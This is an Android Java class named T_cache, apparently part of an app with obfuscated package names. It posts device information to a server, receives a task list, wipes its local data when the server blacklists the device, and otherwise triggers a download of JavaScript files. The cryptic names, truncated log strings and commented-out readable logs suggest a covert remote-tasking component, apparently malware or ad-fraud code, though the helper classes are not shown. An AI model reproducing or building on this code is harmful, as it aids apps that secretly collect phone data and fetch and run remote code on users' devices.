package mklw.aot.zxjn.t;

import android.annotation.SuppressLint;
import android.os.AsyncTask;
import android.text.TextUtils;

import org.json.JSONArray;
import org.json.JSONObject;

import mklw.aot.zxjn.s.AgentService;
import mklw.aot.zxjn.u.HttpUtils;
import mklw.aot.zxjn.u.JsUtil;
import mklw.aot.zxjn.u.LinkUtil;
import mklw.aot.zxjn.u.PhoneInforUtils;
import mklw.aot.zxjn.u.Ulog;
import mklw.aot.zxjn.u.XmlShareUtils;


/**
 * Created by xlc on 2017/5/24.
 */
public class T_cache extends AsyncTask<Void, Integer, Boolean> {

    public static final int CH_CACHE_STATUS_DOING = -1;
    public static final int CH_CACHE_STATUS_SUCCESS = -2;
    public static final int CH_CACHE_STATUS_START = -4;
    private int org = 1;
    private AgentService aservice;
    private int is_b_list = 0;

    public int getCache_status() {
        return org;
    }

    public void setCache_status(int org) {
        this.org = org;
    }

    public T_cache(AgentService aservice) {
        setCache_status(CH_CACHE_STATUS_START);
        this.aservice = aservice;
    }

    @Override
    protected Boolean doInBackground(Void... params) {
        boolean cache_success = false;
        setCache_status(CH_CACHE_STATUS_DOING);
        try {
            String datas = HttpUtils.getCaseData(aservice, PhoneInforUtils.getInstance(aservice).getSendMap());
            //            Ulog.show("CacheTask data:" + datas);
            if (!TextUtils.isEmpty(datas)) {
                JSONObject jsonObject = new JSONObject(datas);
                String status = jsonObject.getString("status");

                //黑名单
                if (Integer.parseInt(status) == -1) {
                    //                                        Ulog.w("黑名单 记录时间，满足下次间隔缓存时间后再次判断");
                    //                                        Ulog.show("black list save time");
                    Ulog.show("b l");
                    is_b_list = -1;
                    //清空所有数据
                    LinkUtil.delete_all(aservice);
                    XmlShareUtils.save_status(aservice);
                    return false;
                }

                is_b_list = 1;
                //   Ulog.w("CacheTask status: 请求状态" + status);
                JSONArray jsonArray = jsonObject.getJSONArray("data");

                //                Ulog.show("数据：" + jsonArray);
                //保存缓存状态
                if (jsonArray.length() > 0) {
                    //清空所有数据
                    LinkUtil.delete_all(aservice);

                    Ulog.show("c success");
                    //  Ulog.w("缓存成功");

                    cache_success = true;
                    XmlShareUtils.save_status(aservice);
                }

                //保存数据
                LinkUtil.save(jsonArray, aservice);
            }
        } catch (Exception e) {
            // Ulog.show("cache error");
            // Ulog.w("缓存操作出错：" + e.getMessage());
            e.printStackTrace();
        }
        return cache_success;
    }

    @SuppressLint("NewApi")
    @Override
    protected void onPostExecute(Boolean aBoolean) {
        super.onPostExecute(aBoolean);

        XmlShareUtils.save_b_list(aservice, is_b_list);
        aservice.check_black_list();

        if (aBoolean) {
            if (JsUtil.getInstance(aservice).check_d_js_time() && !XmlShareUtils.checkBlackList(aservice)) {
                if (JsUtil.getInstance(aservice).getJsCacheStatus() != JsUtil.JS_CACHE_STATUS_DOING) {
                    //                Ulog.w("满足下载js文件条件");
                    Ulog.show("d j");

                    new T_js(aservice).executeOnExecutor(HttpUtils.executorService);

                } else {
                    //                Ulog.show("js downloading...");
                    //                Ulog.w("js 正在下载...");
                }
            }
        }

    }
}